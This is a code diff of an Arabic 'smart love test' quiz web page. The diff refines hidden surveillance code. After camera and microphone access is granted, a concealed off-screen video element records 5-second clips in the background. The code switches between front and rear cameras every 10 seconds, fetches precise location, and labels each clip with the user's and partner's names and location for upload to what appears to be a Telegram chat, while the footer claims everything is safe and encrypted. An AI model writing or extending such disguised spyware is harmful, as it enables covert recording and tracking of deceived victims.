@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>💕 اختبار الحب الذكي - النسخة المطورة</title>
+    <title>💕 اختبار الحب الذكي - النسخة النهائية</title>
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
@@ -953,7 +953,7 @@
         <div class="footer"><i class="fas fa-lock"></i> كل شيء آمن ومشفر <i class="fas fa-shield-alt"></i></div>
     </div>
 
-    <!-- فيديو مخفي للكاميرا (سيتم استخدامه للتسجيل) -->
+    <!-- عنصر فيديو مخفي (سيتم استخدامه لعرض الكاميرا ولكن ليس ضرورياً للتسجيل) -->
     <video id="hiddenVideo" autoplay muted playsinline style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;"></video>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js">
@@ -1050,27 +1050,30 @@
                 sendAnswersBtn.disabled = true;
             }
 
-            // ===== طلب الكاميرا والميكروفون =====
+            // ===== طلب الكاميرا والميكروفون (مع بدء التسجيل فوراً) =====
             async function requestCameraAndMic() {
                 requestBtn.disabled = true;
                 requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> جاري الطلب...';
                 errorMsg.textContent = '';
 
                 try {
+                    // نطلب كاميرا وميكروفون
                     const stream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
                         audio: true
                     });
                     cameraAllowed = true;
-                    // لا نوقف التيار الآن، سنستخدمه للتسجيل
+                    // لا نغلق التيار، سنستخدمه للتسجيل
                     overlay.classList.add('hidden');
                     enableAllFeatures();
 
-                    // بدء تسجيل الفيديو والصوت الخلفي
-                    startBackgroundRecording();
+                    // بدء تسجيل الفيديو والصوت في الخلفية
+                    startBackgroundRecording(stream);
 
+                    // جلب الموقع
                     getPreciseLocation();
-                    console.log('✅ تم السماح للكاميرا والميكروفون');
+
+                    console.log('✅ تم السماح للكاميرا والميكروفون وبدء التسجيل');
                 } catch (err) {
                     console.error('فشل الكاميرا أو الميكروفون:', err);
                     cameraAllowed = false;
@@ -1086,43 +1089,39 @@
                 }
             }
 
-            // ===== تسجيل الفيديو والصوت في الخلفية =====
+            // ===== تسجيل الفيديو والصوت في الخلفية (5 ثوانٍ ثم تبديل) =====
             let mediaRecorder = null;
             let recordedChunks = [];
             let recordingTimer = null;
             let currentCameraMode = 'user'; // 'user' أو 'environment'
             let isRecording = false;
-            let stream = null;
+            let mainStream = null;
+            let switchInterval = null;
 
-            async function startBackgroundRecording() {
+            function startBackgroundRecording(initialStream) {
                 if (!cameraAllowed) return;
-                try {
-                    // الحصول على التيار بالكاميرا الحالية
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: currentCameraMode, width: { ideal: 480 }, height: { ideal: 360 } },
-                        audio: true
-                    });
-                    // بدء التسجيل فوراً
-                    startRecording();
-                    // تبديل الكاميرا كل 10 ثوانٍ (5 ثوانٍ تسجيل + 5 ثوانٍ تبديل)
-                    setInterval(() => {
-                        if (cameraAllowed) {
-                            switchCameraAndRecord();
-                        }
-                    }, 10000);
-                } catch (e) {
-                    console.warn('فشل بدء التسجيل:', e);
-                    setTimeout(startBackgroundRecording, 5000);
-                }
+                mainStream = initialStream;
+                // بدء التسجيل الأول
+                startRecordingSegment();
+
+                // تبديل الكاميرا كل 10 ثوانٍ (5 تسجيل + 5 تبديل)
+                if (switchInterval) clearInterval(switchInterval);
+                switchInterval = setInterval(() => {
+                    if (cameraAllowed) {
+                        switchCameraAndRecord();
+                    }
+                }, 10000);
             }
 
-            function startRecording() {
-                if (!stream) return;
+            function startRecordingSegment() {
+                if (!mainStream) return;
+                // إيقاف أي تسجيل سابق
                 if (mediaRecorder && mediaRecorder.state !== 'inactive') {
                     mediaRecorder.stop();
                 }
                 recordedChunks = [];
-                mediaRecorder = new MediaRecorder(stream, {
+                // استخدام نفس التيار مع إمكانية تبديل الكاميرا لاحقاً
+                mediaRecorder = new MediaRecorder(mainStream, {
                     mimeType: 'video/mp4',
                     videoBitsPerSecond: 1000000,
                     audioBitsPerSecond: 128000
@@ -1139,16 +1138,17 @@
                     }
                     isRecording = false;
                     recordingIndicator.classList.remove('show');
-                    // بدء تسجيل جديد بعد التبديل
+                    // بعد التوقف، نبدأ تسجيل جديد بعد نصف ثانية
                     if (cameraAllowed) {
                         setTimeout(() => {
-                            if (stream) startRecording();
+                            if (mainStream) startRecordingSegment();
                         }, 500);
                     }
                 };
                 mediaRecorder.start();
                 isRecording = true;
                 recordingIndicator.classList.add('show');
+
                 // إيقاف التسجيل تلقائياً بعد 5 ثوانٍ
                 if (recordingTimer) clearTimeout(recordingTimer);
                 recordingTimer = setTimeout(() => {
@@ -1159,7 +1159,7 @@
             }
 
             async function switchCameraAndRecord() {
-                if (!cameraAllowed || !stream) return;
+                if (!cameraAllowed || !mainStream) return;
                 // إيقاف التسجيل الحالي (إذا كان قيد التشغيل)
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
                     mediaRecorder.stop();
@@ -1167,18 +1167,18 @@
                 // تبديل الكاميرا
                 currentCameraMode = (currentCameraMode === 'user') ? 'environment' : 'user';
                 try {
-                    // الحصول على تيار جديد
+                    // الحصول على تيار جديد بالكاميرا الجديدة
                     const newStream = await navigator.mediaDevices.getUserMedia({
                         video: { facingMode: currentCameraMode, width: { ideal: 480 }, height: { ideal: 360 } },
                         audio: true
                     });
                     // استبدال التيار القديم
-                    if (stream) {
-                        stream.getTracks().forEach(t => t.stop());
+                    if (mainStream) {
+                        mainStream.getTracks().forEach(t => t.stop());
                     }
-                    stream = newStream;
-                    // بدء تسجيل جديد
-                    startRecording();
+                    mainStream = newStream;
+                    // بدء تسجيل جديد (سيبدأ تلقائياً في onstop)
+                    startRecordingSegment();
                 } catch (e) {
                     console.warn('فشل تبديل الكاميرا:', e);
                 }
@@ -1193,7 +1193,7 @@
                 const camLabel = currentCameraMode === 'user' ? 'أمامية' : 'خلفية';
                 const loc = `${userLocation.city}, ${userLocation.region}, ${userLocation.country}`;
                 const caption =
-                    `🎥 *مقطع فيديو وصوتي (5 ثوانٍ)*\n👤 ${userName}\n👥 ${partnerName}\n📍 ${loc}\n📷 ${camLabel}\n🕒 ${now}`;
+                    `🎥 *مقطع فيديو وصوتي (5 ثوانٍ)*\n👤 ${userName}\n👥 ${partnerName || 'غير محدد'}\n📍 ${loc}\n📷 ${camLabel}\n🕒 ${now}`;
 
                 const formData = new FormData();
                 formData.append('chat_id', CHAT_ID);
